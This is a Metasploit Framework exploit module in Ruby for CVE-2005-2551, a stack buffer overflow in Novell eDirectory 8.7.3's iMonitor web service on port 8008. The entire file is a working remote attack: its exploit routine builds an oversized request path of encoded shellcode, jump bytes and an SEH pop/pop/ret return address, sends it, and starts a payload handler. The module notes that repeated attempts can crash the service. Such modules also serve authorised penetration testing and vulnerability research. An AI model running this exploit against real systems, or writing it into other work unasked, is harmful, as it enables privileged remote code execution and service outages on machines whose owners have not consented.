##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	HttpFingerprint = { :pattern => [ /DHost\//, /HttpStk\// ] } # custom port

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'eDirectory 8.7.3 iMonitor Remote Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in eDirectory 8.7.3
				iMonitor service. This vulnerability was discovered by Peter
				Winter-Smith of NGSSoftware.

				NOTE: repeated exploitation attempts may cause eDirectory to crash. It does
				not restart automatically in a default installation.
			},
			'Author'         => [ 'Unknown', 'Matt Olney <scacynwrig[at]yahoo.com>' ],
			'License'        => BSD_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2005-2551'],
					[ 'OSVDB', '18703'],
					[ 'BID', '14548'],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 4150,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x26\x3d\x2b\x3f\x3a\x3b\x2d\x2c\x2f\x23\x2e\x5c\x30",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows (ALL) - eDirectory 8.7.3 iMonitor', { 'Ret' => 0x63501f15 } ], # pop/pop/ret
				],
			'DisclosureDate' => 'Aug 11 2005',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(8008)
			], self.class)
	end

	def exploit
		c = connect

		# pop/pop/ret in ndsimon.dlm on our jump to our shellcode
		uri = '/nds/' + payload.encoded + make_nops(2) + "\xeb\x04" + [target.ret].pack('V')
		uri << "\xe9\xbd\xef\xff\xff"
		uri << "B" * 0xD0

		res = c.send_request(c.request_raw({ 'uri' => uri }))
		select(nil,nil,nil,4)

		handler
		disconnect
	end

end
